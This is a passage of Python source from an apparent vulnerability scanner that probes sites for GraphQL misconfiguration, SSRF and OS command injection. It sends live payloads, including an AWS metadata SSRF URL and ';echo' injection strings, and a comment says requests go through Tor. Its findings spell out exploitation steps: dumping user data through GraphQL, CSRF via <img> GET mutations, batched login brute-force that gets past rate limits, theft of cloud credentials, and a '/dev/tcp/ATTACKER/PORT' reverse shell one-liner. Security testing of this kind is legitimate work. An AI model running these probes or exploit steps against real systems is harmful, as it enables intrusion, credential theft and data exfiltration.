    def _check_graphql_introspection(self, base_url: str) -> List[dict]:
        """Probe GraphQL endpoints and detect multiple misconfigs:

        1. Introspection enabled (the classic finding).
        2. GET-based query execution (GraphQL-over-GET, exploitable
           for CSRF — state-changing mutations via a 1x1 <img src=...>).
        3. Batched-query / alias amplification accepted (brute-force
           within a single request, bypasses rate limits).
        4. Specific sensitive types present in the schema (User,
           Credential, Session, etc.) — emitted as an additional
           HIGH finding pointing at the concrete types.
        """
        findings = []
        domain = urlparse(base_url).netloc

        intro_short = {"query": "{ __schema { queryType { name } } }"}
        intro_full = {"query": "{ __schema { types { name fields { name } } } }"}

        for gql_path in self._GQL_PATHS:
            if shutdown_requested() or self._session.is_domain_blocked(domain):
                break
            url = urljoin(base_url, gql_path)

            # A. Confirm the endpoint exists with a short introspection.
            r_short = self._session.post_json(url, intro_short)
            if not r_short or r_short.status_code not in (200, 400):
                continue
            try:
                d_short = r_short.json()
            except Exception:
                continue
            # A GraphQL endpoint returns either data.__schema or
            # errors[].message mentioning a query. Either confirms it
            # IS GraphQL; neither means we're hitting a 404-page-that-
            # happens-to-return-200.
            has_schema = bool(isinstance(d_short.get("data"), dict) and
                              d_short["data"].get("__schema"))
            errs = d_short.get("errors", []) if isinstance(d_short, dict) else []
            looks_gql = has_schema or bool(errs) or d_short.get("data") is not None
            if not looks_gql:
                continue

            # B. Full introspection — emits the main finding if it works.
            if has_schema:
                r_full = self._session.post_json(url, intro_full)
                types = []
                if r_full and r_full.status_code == 200:
                    try:
                        types = (r_full.json().get("data", {})
                                 .get("__schema", {}).get("types", []))
                    except Exception:
                        types = []
                type_names = [t.get("name", "") for t in types
                              if isinstance(t, dict) and t.get("name")]
                sensitive_types = [
                    n for n in type_names
                    if any(kw in n.lower() for kw in
                           ("user", "account", "credential", "session",
                            "token", "secret", "payment", "order",
                            "invoice", "admin"))
                ]
                findings.append({
                    "severity": SEV_HIGH,
                    "title": f"GraphQL introspection enabled at {gql_path}",
                    "detail": ("Full API schema exposed. Attacker can "
                               "discover all queries, mutations, types, "
                               "and fields — then craft targeted queries "
                               "to extract sensitive data."),
                    "evidence": (f"Schema returned {len(type_names)} types. "
                                 f"Sample: {', '.join(type_names[:5])}"
                                 f"{'...' if len(type_names) > 5 else ''}"),
                    "exploitable": True,
                    "test_url": url,
                    "exploit_info": {
                        "type": "graphql_introspection",
                        "path": gql_path,
                        "sensitive_types": sensitive_types[:10],
                        "method": ("POST full introspection, then query "
                                   "sensitive types directly. Common "
                                   "dumps: '{ users { id email } }', "
                                   "'{ me { role } }', '{ orders { "
                                   "userId total } }'."),
                        "risk": "Data exfiltration of all API-accessible data",
                    },
                })
                if sensitive_types:
                    findings.append({
                        "severity": SEV_HIGH,
                        "title": (f"GraphQL exposes sensitive type(s): "
                                  f"{', '.join(sensitive_types[:5])}"),
                        "detail": (f"The schema defines "
                                   f"{len(sensitive_types)} type name(s) "
                                   f"that look like auth/user/payment "
                                   f"primitives. Direct queries against "
                                   f"these types, authenticated or not, "
                                   f"are often unrestricted."),
                        "evidence": f"Types: {', '.join(sensitive_types[:10])}",
                        "exploitable": True,
                        "test_url": url,
                        "exploit_info": {
                            "type": "graphql_data_exposure",
                            "path": gql_path,
                            "sensitive_types": sensitive_types[:10],
                            "method": ("Craft per-type queries "
                                       "following the schema's "
                                       "fields[]. Many endpoints "
                                       "enforce auth on REST but not "
                                       "GraphQL."),
                            "risk": "Unauthenticated data exfiltration",
                        },
                    })

            # C. GraphQL-over-GET (CSRF class): same query via GET.
            if not shutdown_requested():
                from urllib.parse import quote as _q
                q = "{ __schema { queryType { name } } }"
                get_url = f"{url}?query={_q(q)}"
                r_get = self._session.get(get_url, allow_wayback=False)
                if r_get and r_get.status_code == 200 and r_get.text:
                    try:
                        d_get = r_get.json()
                    except Exception:
                        d_get = None
                    if (isinstance(d_get, dict) and
                            isinstance(d_get.get("data"), dict) and
                            d_get["data"].get("__schema")):
                        findings.append({
                            "severity": SEV_HIGH,
                            "title": f"GraphQL accepts queries via GET at {gql_path}",
                            "detail": ("GraphQL-over-GET makes every "
                                       "mutation CSRF-exploitable: "
                                       "<img src=...?query=mutation...> "
                                       "fires with the victim's cookies "
                                       "attached. CSRF tokens don't "
                                       "apply to GETs."),
                            "evidence": f"GET {gql_path}?query=... returned __schema",
                            "exploitable": True,
                            "test_url": url,
                            "exploit_info": {
                                "type": "graphql_introspection",
                                "path": gql_path,
                                "method": ("Craft a GET URL with a "
                                           "state-changing mutation as "
                                           "the query and embed it in "
                                           "an <img> on an attacker "
                                           "page. Victim cookies "
                                           "authenticate it."),
                                "risk": "CSRF on every GraphQL mutation",
                            },
                        })

            # D. Batched-query amplification check.
            # Many servers execute a list of queries in a single request —
            # the perfect rate-limit bypass for brute-force (login
            # mutations, one-time-password guesses, etc.).
            if not shutdown_requested():
                batch = [intro_short, intro_short, intro_short]
                r_batch = self._session.post_json(url, batch)
                if r_batch and r_batch.status_code == 200 and r_batch.text:
                    try:
                        d_batch = r_batch.json()
                    except Exception:
                        d_batch = None
                    if isinstance(d_batch, list) and len(d_batch) >= 2:
                        findings.append({
                            "severity": SEV_MEDIUM,
                            "title": f"GraphQL accepts batched queries at {gql_path}",
                            "detail": ("The server returned a list of "
                                       "responses for a batched query "
                                       "array. Combine with a login "
                                       "mutation and you get N "
                                       "password guesses per HTTP "
                                       "request — rate limits applied "
                                       "per HTTP request can be "
                                       "bypassed."),
                            "evidence": f"Batch of {len(batch)} queries → list of {len(d_batch)} results",
                            "exploitable": True,
                            "test_url": url,
                            "exploit_info": {
                                "type": "graphql_batching",
                                "path": gql_path,
                                "method": ("POST [{mutation: login(x)}, "
                                           "{mutation: login(y)}, ...] "
                                           "— one HTTP request, many "
                                           "login attempts."),
                                "risk": "Rate-limit bypass, brute-force amplification",
                            },
                        })

            # We found a live GraphQL endpoint; no point probing more
            # paths. (Multiple mounts of the same service at different
            # paths would just repeat the same findings.)
            if findings:
                return findings
        return findings

    def _check_ssrf_indicators(self, base_url: str) -> List[dict]:
        """Check for SSRF (Server-Side Request Forgery) indicators."""
        findings = []
        ssrf_params = self._get_test_params(["url", "uri", "src", "source", "href", "link",
                       "img", "image", "fetch", "load", "proxy"])
        # We use a unique callback canary — if the server fetches it, SSRF exists.
        # Since we can't host a listener through Tor easily, we check for error
        # responses that reveal the server tried to fetch the URL.
        canary_url = "http://169.254.169.254/latest/meta-data/"  # AWS metadata

        for param in ssrf_params[:5]:
            if shutdown_requested():
                break
            # Baseline: check what the page returns without SSRF payload
            baseline_url = f"{base_url}?{param}=https://example.com/"
            baseline_resp = self._session.get(baseline_url, allow_wayback=False)
            baseline_text = baseline_resp.text.lower() if baseline_resp else ""

            test_url = f"{base_url}?{param}={quote(canary_url)}"
            resp = self._session.get(test_url, allow_wayback=False)
            if resp and resp.text:
                # Use specific AWS metadata indicators that rarely appear in
                # documentation or normal pages. Require 3+ to avoid FP from
                # pages that mention "meta-data" or "iam" in their own content.
                aws_indicators = [
                    "ami-id", "instance-id", "instance-type",
                    "local-hostname", "public-hostname", "security-credentials",
                ]
                text_lower = resp.text.lower()
                matched = [ind for ind in aws_indicators
                           if ind in text_lower and ind not in baseline_text]
                if len(matched) >= 3:
                    findings.append({
                        "severity": SEV_CRITICAL,
                        "title": f"SSRF via '{param}' parameter — AWS metadata accessible",
                        "detail": "Server fetches attacker-supplied URLs internally. "
                                  "AWS instance metadata (credentials, keys) is readable.",
                        "evidence": f"Parameter: {param}, AWS indicators: {', '.join(matched[:3])}",
                        "exploitable": True,
                        "exploit_info": {
                            "type": "ssrf",
                            "parameter": param,
                            "method": f"Supply internal URLs via '{param}' parameter. "
                                      "Target: http://169.254.169.254/ for cloud credentials, "
                                      "http://127.0.0.1:<port>/ for internal services.",
                            "risk": "Cloud credential theft, internal network access",
                        },
                    })
                    return findings
        return findings

    def _check_command_injection(self, base_url: str) -> List[dict]:
        """Check for OS command injection indicators."""
        findings = []
        cmd_params = self._get_test_params(["cmd", "exec", "command", "ping", "host", "ip", "query"])
        # Use a time-based detection: if sleep(5) makes the response 5s slower,
        # command injection exists. Canary: semicolon + sleep.
        # We also check for direct output of common commands.

        for param in cmd_params[:3]:
            if shutdown_requested():
                return findings
            marker = f"gs{secrets.token_hex(4)}rce"
            payload = f";echo {marker}"

            # Baseline: check if the param value is simply echoed back (search page etc.)
            baseline_marker = f"gs{secrets.token_hex(4)}base"
            baseline_url = f"{base_url}?{param}={quote(baseline_marker)}"
            baseline_resp = self._session.get(baseline_url, allow_wayback=False)
            baseline_echoes = baseline_resp and baseline_marker in baseline_resp.text

            test_url = f"{base_url}?{param}={quote(payload)}"
            resp = self._session.get(test_url, allow_wayback=False)
            # Only flag if marker appears AND it's not just the page echoing
            # back whatever we send (which search pages and error pages do)
            if resp and marker in resp.text and not baseline_echoes:
                findings.append({
                    "severity": SEV_CRITICAL,
                    "title": f"OS Command Injection via '{param}' parameter",
                    "detail": "Arbitrary OS commands execute on the server. "
                              "Full system compromise possible.",
                    "evidence": f"Parameter: {param}, echo marker reflected in response",
                    "exploitable": True,
                    "exploit_info": {
                        "type": "command_injection",
                        "parameter": param,
                        "method": f"Inject OS commands via '{param}' parameter. "
                                  "Use: ;command or |command or $(command). "
                                  "For reverse shell: ;bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
                        "risk": "Full system compromise, data exfiltration, lateral movement",
                    },
                })
                return findings
        return findings

